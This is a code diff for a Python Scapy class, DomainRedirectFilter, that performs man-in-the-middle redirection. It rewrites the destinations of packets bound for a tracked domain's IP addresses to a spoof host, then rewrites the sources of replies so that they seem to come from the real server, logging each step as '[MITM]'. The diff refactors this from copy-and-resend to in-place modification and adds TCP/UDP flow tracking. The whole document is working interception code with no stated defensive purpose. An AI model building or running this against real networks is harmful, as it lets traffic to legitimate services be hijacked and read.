@@ -1,4 +1,4 @@
-from scapy.all import IP, TCP, UDP, send
+from scapy.all import IP, TCP, UDP
 from scapy.layers.inet6 import IPv6
 
 class DomainRedirectFilter:
@@ -8,73 +8,70 @@ class DomainRedirectFilter:
         self.spoof_ipv6 = spoof_ipv6
         self.logger = logger
 
-        # flow tracking: (client_ip, client_port, proto) → server_ip
+        # (client_ip, client_port, proto) → real_server_ip
         self.flows = {}
 
     def log(self, msg):
         if self.logger:
             self.logger(msg)
-        else:
-            print(msg)
 
     def __call__(self, pkt):
-        # ──────────────── IPv4 ────────────────
+        # ───────────── IPv4 ─────────────
         if pkt.haslayer(IP):
             ip = pkt[IP]
 
+            proto = None
+            if pkt.haslayer(TCP):
+                proto = "TCP"
+                sport = pkt[TCP].sport
+                dport = pkt[TCP].dport
+            elif pkt.haslayer(UDP):
+                proto = "UDP"
+                sport = pkt[UDP].sport
+                dport = pkt[UDP].dport
+            else:
+                return False
+
             # CLIENT → SERVER
             if ip.dst in self.domain_tracker.ips_v4:
-                key = (ip.src, pkt.sport if pkt.haslayer(TCP) else None)
-                self.flows[key] = ip.dst
+                self.flows[(ip.src, sport, proto)] = ip.dst
 
-                new = pkt.copy()
-                new[IP].dst = self.spoof_ip
+                ip.dst = self.spoof_ip
+                del ip.chksum
+                if proto == "TCP":
+                    del pkt[TCP].chksum
+                else:
+                    del pkt[UDP].chksum
 
-                del new[IP].chksum
-                if pkt.haslayer(TCP):
-                    del new[TCP].chksum
-                if pkt.haslayer(UDP):
-                    del new[UDP].chksum
+                self.log(f"[MITM] Redirect → {self.spoof_ip}")
+                return False 
 
-                send(new, verbose=False)
-                self.log(f"[MITM] Redirect IPv4 → {self.spoof_ip}")
-                return True
-
-            # SERVER → CLIENT
+            # SPOOF SERVER → CLIENT
             if ip.src == self.spoof_ip:
-                key = (ip.dst, pkt.dport if pkt.haslayer(TCP) else None)
+                key = (ip.dst, dport, proto)
                 if key not in self.flows:
                     return False
 
-                real_ip = self.flows[key]
+                ip.src = self.flows[key]
+                del ip.chksum
+                if proto == "TCP":
+                    del pkt[TCP].chksum
+                else:
+                    del pkt[UDP].chksum
 
-                new = pkt.copy()
-                new[IP].src = real_ip
+                self.log(f"[MITM] Restore src → {ip.src}")
+                return False
 
-                del new[IP].chksum
-                if pkt.haslayer(TCP):
-                    del new[TCP].chksum
-                if pkt.haslayer(UDP):
-                    del new[UDP].chksum
-
-                send(new, verbose=False)
-                self.log(f"[MITM] Restore IPv4 src {real_ip}")
-                return True
-
-        # ──────────────── IPv6 ────────────────
-        if pkt.haslayer(IPv6):
+        # ───────────── IPv6 (optional) ─────────────
+        if pkt.haslayer(IPv6) and self.spoof_ipv6:
             ip6 = pkt[IPv6]
 
             if ip6.dst in self.domain_tracker.ips_v6:
-                new = pkt.copy()
-                new[IPv6].dst = self.spoof_ipv6
-                send(new, verbose=False)
-                return True
+                ip6.dst = self.spoof_ipv6
+                return False
 
             if ip6.src == self.spoof_ipv6:
-                new = pkt.copy()
-                new[IPv6].src = list(self.domain_tracker.ips_v6)[0]
-                send(new, verbose=False)
-                return True
+                ip6.src = next(iter(self.domain_tracker.ips_v6))
+                return False
 
         return False
